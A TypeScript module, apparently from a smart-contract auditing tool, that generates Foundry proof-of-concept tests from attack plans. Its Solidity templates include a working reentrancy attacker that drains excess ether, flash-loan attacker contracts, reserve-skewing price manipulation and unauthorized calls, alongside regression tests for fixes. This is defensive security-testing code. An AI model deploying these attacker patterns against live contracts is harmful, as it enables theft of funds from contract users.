import path from "node:path";
import { promises as fs } from "node:fs";
import { sanitizeIdentifier } from "./solidity.js";
import type { GeneratedTest, ValidatedAttackPlan } from "./types.js";

function solidityLiteral(type: string | undefined, value: string | number | boolean): string {
  if (!type) {
    return String(value);
  }
  if (type === "address") {
    return typeof value === "string" ? value : `address(${String(value)})`;
  }
  if (type === "bool") {
    return String(value);
  }
  if (type.startsWith("uint") || type.startsWith("int")) {
    return String(value);
  }
  return String(value);
}

function buildFunctionCallArguments(plan: ValidatedAttackPlan): string {
  const signatureArgTypes = plan.normalizedSampleArguments.map((_, index) => {
    if (plan.targetStateVariableKeyType && index === 0 && plan.attackType === "access-control" && plan.targetStateVariableType?.startsWith("mapping")) {
      return plan.targetStateVariableKeyType;
    }
    return undefined;
  });

  return plan.normalizedSampleArguments
    .map((value, index) => solidityLiteral(signatureArgTypes[index], value))
    .join(", ");
}

function buildObservedValueExpression(plan: ValidatedAttackPlan): string | null {
  if (!plan.targetStateVariable) {
    return null;
  }
  if (plan.targetStateVariableType?.startsWith("mapping")) {
    const key = plan.normalizedSampleArguments[0];
    return `target.${plan.targetStateVariable}(${solidityLiteral(plan.targetStateVariableKeyType, key)})`;
  }
  return `target.${plan.targetStateVariable}()`;
}

function buildAccessControlTest(plan: ValidatedAttackPlan): string {
  const observedExpr = buildObservedValueExpression(plan);
  const functionName = plan.resolvedFunctions[0];
  const args = buildFunctionCallArguments(plan);

  if (!observedExpr) {
    throw new Error(`Could not materialize access-control proof scaffold for ${plan.contractName} without an observable state variable`);
  }

  return `    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        ${plan.contractName} target = new ${plan.contractName}(${plan.constructorArgs ?? ""});
        uint256 beforeValue = uint256(${observedExpr});
        vm.prank(address(0xDEAD));
        target.${functionName}(${args});
        uint256 afterValue = uint256(${observedExpr});
        require(afterValue != beforeValue, "unauthorized call did not mutate observable state");
    }
`;
}

function buildArithmeticTest(plan: ValidatedAttackPlan): string {
  const observedExpr = buildObservedValueExpression(plan);
  const functionName = plan.resolvedFunctions[0];
  const args = buildFunctionCallArguments(plan);

  if (!observedExpr) {
    throw new Error(`Could not materialize arithmetic proof scaffold for ${plan.contractName} without an observable state variable`);
  }

  return `    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        ${plan.contractName} target = new ${plan.contractName}(${plan.constructorArgs ?? ""});
        uint256 beforeValue = uint256(${observedExpr});
        target.${functionName}(${args});
        uint256 afterValue = uint256(${observedExpr});
        require(afterValue != beforeValue, "arithmetic path did not change observable state");
        require(afterValue > beforeValue, "expected arithmetic drift was not observed");
    }
`;
}

function buildAccessControlRegressionTest(plan: ValidatedAttackPlan): string {
  const functionName = plan.resolvedFunctions[0];
  const args = buildFunctionCallArguments(plan);
  return `    function test_${sanitizeIdentifier(plan.attackType)}_regression() public {
        ${plan.contractName} target = new ${plan.contractName}(${plan.constructorArgs ?? ""});
        vm.prank(address(0xDEAD));
        vm.expectRevert();
        target.${functionName}(${args});
    }
`;
}

function buildReentrancyRegressionTest(plan: ValidatedAttackPlan): string {
  const functionName = plan.resolvedFunctions[0];
  return `
contract ${plan.contractName}RegressionTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_${sanitizeIdentifier(plan.attackType)}_regression() public {
        ${plan.contractName} target = new ${plan.contractName}(${plan.constructorArgs ?? ""});
        ${plan.contractName}ReentrancyAttacker attacker = new ${plan.contractName}ReentrancyAttacker(target);
        vm.deal(address(this), 1 ether);
        vm.deal(address(target), 2 ether);
        attacker.attack{value: 1 ether}();
        require(attacker.reentryCount() <= 1, "reentrant callback should have been blocked by fix");
        require(address(attacker).balance <= 1 ether, "attacker should not extract excess value after fix");
    }
}
`;
}

function buildReentrancyTest(plan: ValidatedAttackPlan): string {
  const functionName = plan.resolvedFunctions[0];
  const setupFn = plan.reentrancySetupFunction ?? "deposit";
  return `interface Vm {
    function deal(address who, uint256 newBalance) external;
}

contract ${plan.contractName}ReentrancyAttacker {
    ${plan.contractName} internal target;
    uint256 public reentryCount;

    constructor(${plan.contractName} _target) {
        target = _target;
    }

    function attack() external payable {
        target.${setupFn}{value: msg.value}();
        target.${functionName}();
    }

    receive() external payable {
        if (reentryCount == 0) {
            reentryCount = 1;
            (bool ok,) = address(target).call(abi.encodeWithSignature("${functionName}()"));
            if (ok) reentryCount = 2;
        }
    }
}

contract ${plan.contractName}${sanitizeIdentifier(plan.attackType)}Test {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        ${plan.contractName} target = new ${plan.contractName}(${plan.constructorArgs ?? ""});
        ${plan.contractName}ReentrancyAttacker attacker = new ${plan.contractName}ReentrancyAttacker(target);
        vm.deal(address(this), 1 ether);
        vm.deal(address(target), 2 ether);
        attacker.attack{value: 1 ether}();
        require(attacker.reentryCount() == 2, "reentrant callback was not observed");
        require(address(attacker).balance > 1 ether, "attacker did not extract excess value");
    }
}
`;
}

function buildFlashLoanLenderTest(plan: ValidatedAttackPlan): string {
  const lendFn = plan.resolvedFunctions[0] ?? "flashLoan";
  const observedExpr = buildObservedValueExpression(plan);
  const beforeLine = observedExpr ? `uint256 beforeValue = uint256(${observedExpr});` : "uint256 beforeValue = 0;";
  const stateCapture = observedExpr ? `observedStateValue = uint256(${observedExpr});` : "observedStateValue = 1;";
  const assertLine = observedExpr
    ? `require(attacker.observedStateValue() > beforeValue, "flash loan did not skew observable state");`
    : `require(attacker.observedStateValue() > 0, "flash loan callback was not reached");`;

  return `interface Vm {
    function deal(address who, uint256 newBalance) external;
}

contract ${plan.contractName}FlashLoanBorrower {
    ${plan.contractName} internal target;
    uint256 public observedStateValue;

    constructor(${plan.contractName} _target) {
        target = _target;
    }

    function attack(uint256 amount) external {
        target.${lendFn}(address(this), amount);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        ${stateCapture}
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}

contract ${plan.contractName}${sanitizeIdentifier(plan.attackType)}Test {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        ${plan.contractName} target = new ${plan.contractName}(${plan.constructorArgs ?? ""});
        ${plan.contractName}FlashLoanBorrower attacker = new ${plan.contractName}FlashLoanBorrower(target);
        vm.deal(address(target), 2 ether);
        ${beforeLine}
        attacker.attack(1 ether);
        ${assertLine}
    }
}
`;
}

function buildFlashLoanReceiverTest(plan: ValidatedAttackPlan): string {
  const callbackFn = plan.resolvedFunctions[0] ?? "onFlashLoan";
  const observedExpr = buildObservedValueExpression(plan);
  const observeBefore = observedExpr ? `uint256 beforeValue = uint256(${observedExpr});` : "";
  const observeAfter = observedExpr ? `uint256 afterValue = uint256(${observedExpr});` : "";
  const assertion = observedExpr
    ? `require(afterValue != beforeValue, "flash loan did not skew observable state");`
    : `require(address(attacker).balance > 0, "flash loan attacker did not receive funds");`;

  return `interface Vm {
    function deal(address who, uint256 newBalance) external;
}

contract MockFlashLender {
    function flashLoan(address borrower, uint256 amount) external {
        (bool ok,) = borrower.call{value: amount}(abi.encodeWithSignature("${callbackFn}(address,uint256,uint256,bytes)", address(this), amount, 0, bytes("")));
        require(ok, "flash loan callback failed");
    }

    receive() external payable {}
}

contract ${plan.contractName}FlashLoanAttacker {
    ${plan.contractName} internal target;
    MockFlashLender internal lender;

    constructor(${plan.contractName} _target, MockFlashLender _lender) {
        target = _target;
        lender = _lender;
    }

    function attack(uint256 amount) external {
        lender.flashLoan(address(this), amount);
    }

    function ${callbackFn}(address, uint256 amount, uint256, bytes calldata) external payable returns (bytes32) {
        // Callback: manipulate target state during the loan
        (bool ok,) = address(target).call(abi.encodeWithSignature("${callbackFn}(address,uint256,uint256,bytes)", address(lender), amount, 0, bytes("")));
        ok;
        // Repay
        payable(address(lender)).transfer(amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}

contract ${plan.contractName}${sanitizeIdentifier(plan.attackType)}Test {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        ${plan.contractName} target = new ${plan.contractName}(${plan.constructorArgs ?? ""});
        MockFlashLender lender = new MockFlashLender();
        ${plan.contractName}FlashLoanAttacker attacker = new ${plan.contractName}FlashLoanAttacker(target, lender);
        vm.deal(address(lender), 10 ether);
        ${observeBefore}
        attacker.attack(1 ether);
        ${observeAfter}
        ${assertion}
    }
}
`;
}

function buildFlashLoanTest(plan: ValidatedAttackPlan): string {
  if (plan.flashLoanRole === "lender") return buildFlashLoanLenderTest(plan);
  return buildFlashLoanReceiverTest(plan);
}

function buildPriceManipulationTest(plan: ValidatedAttackPlan): string {
  const functionName = plan.resolvedFunctions[0] ?? "getPrice";
  const observedExpr = buildObservedValueExpression(plan);
  const observeBefore = observedExpr ? `uint256 fairPrice = uint256(${observedExpr});` : "uint256 fairPrice = 1e18;";
  const observeAfter = observedExpr ? `uint256 skewedPrice = uint256(${observedExpr});` : "uint256 skewedPrice = 0;";

  return `contract MockAMMPair {
    uint112 private reserve0 = 1000 ether;
    uint112 private reserve1 = 1000 ether;

    function setReserves(uint112 _reserve0, uint112 _reserve1) external {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, uint32(block.timestamp));
    }
}

contract ${plan.contractName}${sanitizeIdentifier(plan.attackType)}Test {
    function test_${sanitizeIdentifier(plan.attackType)}_proof_scaffold() public {
        MockAMMPair pair = new MockAMMPair();
        ${plan.contractName} target = new ${plan.contractName}(${plan.constructorArgs ?? ""});
        // Observe price at fair reserves
        ${observeBefore}
        // Skew reserves to simulate manipulation
        pair.setReserves(1 ether, 1000000 ether);
        // Price-consuming function acts on skewed reserves
        target.${functionName}();
        ${observeAfter}
        require(skewedPrice != fairPrice, "price manipulation did not affect observable state");
    }
}
`;
}

function buildTestSource(testFilePath: string, plan: ValidatedAttackPlan): string {
  const relativeImport = path.relative(path.dirname(testFilePath), plan.contractPath).replace(/\\/g, "/");
  const contractImport = relativeImport.startsWith(".") ? relativeImport : `./${relativeImport}`;
  const testContractName = `${plan.contractName}${sanitizeIdentifier(plan.attackType)}Test`;

  const header = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {${plan.contractName}} from "${contractImport}";

`;

  if (plan.attackType === "reentrancy") {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {${plan.contractName}} from "${contractImport}";

${buildReentrancyTest(plan)}${buildReentrancyRegressionTest(plan)}`;
  }

  if (plan.attackType === "flash-loan") {
    return header + buildFlashLoanTest(plan);
  }

  if (plan.attackType === "price-manipulation") {
    return header + buildPriceManipulationTest(plan);
  }

  if (plan.attackType === "access-control") {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {${plan.contractName}} from "${contractImport}";

interface Vm {
    function prank(address sender) external;
    function expectRevert() external;
}

contract ${testContractName} {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

${buildAccessControlTest(plan)}${buildAccessControlRegressionTest(plan)}}
`;
  }

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {${plan.contractName}} from "${contractImport}";

contract ${testContractName} {
${buildArithmeticTest(plan)}}
`;
}

/**
 * Generates Solidity proof-of-concept test scaffold files for each validated attack plan.
 *
 * @param projectRoot - Absolute path to the Foundry project root.
 * @param validatedPlans - Array of validated attack plans to generate test scaffolds for.
 * @returns Array of generated test metadata including file paths and source content.
 */
export async function generateProofScaffolds(projectRoot: string, validatedPlans: ValidatedAttackPlan[]): Promise<GeneratedTest[]> {
  const testDir = path.join(projectRoot, "test", "raze");
  await fs.mkdir(testDir, { recursive: true });

  const tests: GeneratedTest[] = [];
  for (const plan of validatedPlans) {
    const fileName = `${plan.contractName}.${sanitizeIdentifier(plan.attackType)}.t.sol`;
    const testFilePath = path.join(testDir, fileName);
    const source = buildTestSource(testFilePath, plan);
    await fs.writeFile(testFilePath, source, "utf8");
    tests.push({
      findingType: plan.attackType,
      testFilePath,
      source,
      planSource: plan.planSource,
      proofIntent: plan.proofGoal
    });
  }

  return tests;
}
